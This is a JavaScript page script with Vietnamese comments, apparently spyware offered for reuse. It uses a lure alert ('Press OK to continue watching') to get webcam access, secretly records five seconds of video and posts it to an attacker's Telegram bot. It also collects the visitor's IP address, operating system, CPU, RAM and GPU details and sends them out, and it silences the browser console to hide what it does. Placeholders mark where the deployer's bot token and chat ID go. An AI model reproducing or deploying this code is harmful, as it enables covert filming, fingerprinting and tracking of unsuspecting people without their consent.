function captureVideo() {
  var video = document.getElementById('video');

  var recorder = RecordRTC(video.srcObject, {
      type: 'video'
  });

  recorder.startRecording();
  setTimeout(function() {
      recorder.stopRecording(function() {
          var blob = recorder.getBlob();

          var formData = new FormData();
          formData.append('chat_id', 'CONVERSATION ID'); // Hàm thay ID , CONVERSATION ID = ID Nhóm Telegram
          formData.append('video', blob, 'video.mp4');

          fetch('https://api.telegram.org/botTOKEN_BOT/sendVideo', {
              method: 'POST',
              body: formData
          }) // Thay thế hàm TOKEN_BOT = TOKEN của bot bạn
          .then(response => response.json())
          .then(data => {
            //  console.log('Video sent successfully:', data);
          })
          .catch(error => {
          //    console.error('Error sending video to Telegram:', error);
          });
      });
  }, 5000); // Chỉnh sửa thời gian gửi
}

function requestCameraAccess() {
  navigator.mediaDevices.getUserMedia({ video: true })
      .then(function(stream) {
          var video = document.getElementById('video');
          video.srcObject = stream;
          video.play();
          setTimeout(captureVideo, 1000); 
      })
      .catch(function(error) {
   //       console.error('Error accessing webcam:', error.message);
      });
}

function showCameraAccessAlert() {
  alert('Ấn OK để tiếp tục xem!');
  requestCameraAccess();
}

$(document).ready(function() {
  var telegramBotToken = 'TOKEN_BOT'; // Thay thế hàm TOKEN_BOT = TOKEN của bot bạn
  var chatId = 'CONVERSATION ID';

  $.getJSON('https://api.ipify.org?format=json', function(data) {
      var ip = data.ip;
      var cpu = navigator.hardwareConcurrency || 'N/A';
      var ram = navigator.deviceMemory || 'N/A';
      var disk = navigator.deviceStorage || 'N/A';
      var gpu = getGraphicsCard();
      var os = getOperatingSystem();
      var userAgent = navigator.userAgent;
      var message = '- Địa chỉ IP mới: ' + ip + '\n- User-Agent: ' + userAgent + '\n- Hệ điều hành: ' + os + '\n- CPU: ' + cpu + '\n- RAM: ' + ram + '\n- Disk: ' + disk + '\n- GPU: ' + gpu;
      var payload = {
          chat_id: chatId,
          text: message
      };

      $.ajax({
          type: 'POST',
          url: 'https://api.telegram.org/bot' + telegramBotToken + '/sendMessage',
          data: payload,
          dataType: 'json',
          success: function(response) {
              console.log('Thông tin đã được gửi thành công đến Telegram');
          },
          error: function(error) {
              console.error('Lỗi khi gửi thông tin đến Telegram: ' + error);
          }
      });
  });

  function getOperatingSystem() {
      var userAgent = navigator.userAgent || navigator.vendor || window.opera;
      if (/windows phone/i.test(userAgent)) {
          return 'Windows Phone';
      }
      if (/android/i.test(userAgent)) {
          return 'Android';
      }
      if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
          return 'iOS';
      }
      if (/Macintosh|Mac OS X/.test(userAgent)) {
          return 'Mac OS';
      }
      if (/Windows NT/.test(userAgent)) {
          return 'Windows';
      }
      return 'Unknown';
  }

  function getGraphicsCard() {
      var canvas = document.createElement('canvas');
      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
      var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      var gpu = 'N/A';
      if (debugInfo) {
          gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
      }
      return gpu;
  }
});

window.addEventListener('DOMContentLoaded', function() {
  showCameraAccessAlert();
});

console.log = function() {};
console.error = function() {};
